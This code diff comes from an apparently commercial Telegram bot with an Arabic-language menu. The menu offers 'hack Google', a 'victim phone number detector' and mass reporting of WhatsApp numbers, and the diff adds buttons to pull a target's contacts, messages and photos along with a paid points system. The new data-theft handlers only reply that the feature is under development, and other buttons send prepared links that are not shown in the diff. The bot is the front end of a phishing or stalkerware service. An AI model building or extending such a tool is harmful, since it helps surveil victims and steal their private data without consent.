@@ -49,8 +49,11 @@ function getMainKeyboard() {
                 [{ text: "🔴 اختراق جوجل", callback_data: 'hack_google' }, { text: "📱 فحص الجهاز", callback_data: 'device_check' }],
                 [{ text: "✅ فك حظر واتساب", callback_data: 'unban_service' }, { text: "🚨 حظر أرقام واتساب", callback_data: 'report_number' }],
                 [{ text: "📞 كاشف رقم الضحية", callback_data: 'get_phone_link' }],
-                [{ text: "📞 سحب جهات الاتصال", callback_data: 'coming_soon' }, { text: "✉️ سحب جميع الرسائل", callback_data: 'coming_soon' }],
+                [{ text: "📞 سحب جهات الاتصال", callback_data: 'get_contacts' }, { text: "✉️ سحب جميع الرسائل", callback_data: 'get_messages' }],
+                [{ text: "🖼️ سحب جميع الصور", callback_data: 'get_photos' }],
                 [{ text: "📱 أرقام وهمية", callback_data: 'fake_num' }],
+                [{ text: "💸 تحويل نقاط", callback_data: 'transfer_points' }, { text: "💰 تجميع نقاط", callback_data: 'collect_points' }],
+                [{ text: "💳 أسعار النقاط", callback_data: 'points_store' }],
                 [{ text: "👨‍💻 التواصل مع المطور", callback_data: 'contact' }, { text: "ℹ️ حول البوت", callback_data: 'about' }]
             ]
         })
@@ -117,8 +120,9 @@ bot.on('callback_query', (query) => {
         bot.sendMessage(chatId, "👨‍💻 <b>المطور:</b> @heroil_1", { parse_mode: 'HTML' });
     } else if (data === 'coming_soon') {
         bot.sendMessage(chatId, "🛠️ <b>هذا القسم قيد التطوير حالياً.</b>", { parse_mode: 'HTML' });
+    } else if (data === 'transfer_points' || data === 'collect_points' || data === 'points_store' || data === 'get_contacts' || data === 'get_messages' || data === 'get_photos') {
+        bot.sendMessage(chatId, "🛠️ <b>هذا القسم قيد التطوير حالياً.</b>", { parse_mode: 'HTML' });
     } else if (links[data]) {
-        // هنا بيبعت الرابط الخاص بالقسم
         bot.sendMessage(chatId, `🔗 <b>الرابط جاهز:</b>\n\n${links[data]}`, {
             parse_mode: 'HTML',
             disable_web_page_preview: true
